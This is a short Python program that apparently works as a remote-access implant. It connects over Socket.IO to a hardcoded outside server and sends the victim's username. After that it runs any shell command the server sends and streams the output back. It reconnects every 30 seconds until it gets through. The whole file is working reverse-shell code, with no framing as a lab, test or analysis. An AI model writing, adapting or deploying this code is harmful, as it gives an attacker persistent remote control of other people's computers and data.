import subprocess
import socketio
import time
import os
import sys

sio = socketio.Client()
SERVER_URL = 'http://raveneye.glitch.me/'

def get_current_working_directory():
    return os.getcwd()

def execute_command(cmd, cwd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=cwd)
        return result
    except Exception as e:
        return subprocess.CompletedProcess(cmd, returncode=-1, stderr=str(e))

def get_current_user():
    result = execute_command('whoami', mycwd)
    return result.stdout.strip() if result.returncode == 0 else 'unknown_user'

mycwd = get_current_working_directory()
whoami = get_current_user()

@sio.on('connect')
def on_connect():
    sio.emit('intro', whoami)

@sio.on('cmd')
def on_command_received(cmd):
    global mycwd

    if cmd.strip().lower() == 'sleepnow':
        handle_sleep_now()
        return

    if cmd.startswith('cd '):
        path = cmd.split(' ', 1)[1]
        handle_directory_change(path)
    else:
        execute_and_emit_command(cmd)

def handle_sleep_now():
    sio.emit('command', {'user': whoami, 'cmd': 'Shutting down as per SleepNow command'})
    time.sleep(3)
    sio.disconnect()
    sys.exit(0)

def handle_directory_change(path):
    global mycwd

    if len(path) == 2 and path[1] == ':':
        try:
            os.chdir(path + "\\")
            mycwd = get_current_working_directory()
            sio.emit('command', {'user': whoami, 'cmd': f"Switched to {mycwd}"})
        except Exception as e:
            sio.emit('command', {'user': whoami, 'cmd': f"Error: {str(e)}"})
    else:
        try:
            os.chdir(path)
            mycwd = get_current_working_directory()
            sio.emit('command', {'user': whoami, 'cmd': f"Directory changed to {mycwd}"})
        except FileNotFoundError:
            sio.emit('command', {'user': whoami, 'cmd': f"Error: Directory not found: {path}"})
        except Exception as e:
            sio.emit('command', {'user': whoami, 'cmd': f"Error: {str(e)}"})

def execute_and_emit_command(cmd):
    result = execute_command(cmd, mycwd)

    if result.returncode == 0:
        sio.emit('command', {'user': whoami, 'cmd': result.stdout.strip()})
    else:
        sio.emit('command', {'user': whoami, 'cmd': f"Error: {result.stderr.strip()}"})

def connect_to_server():
    while True:
        try:
            sio.connect(SERVER_URL)
            break
        except socketio.exceptions.ConnectionError as e:
            print(f"Connection failed: {e}. Retrying in 30 seconds...")
            time.sleep(30)

if __name__ == "__main__":
    connect_to_server()
    sio.wait()
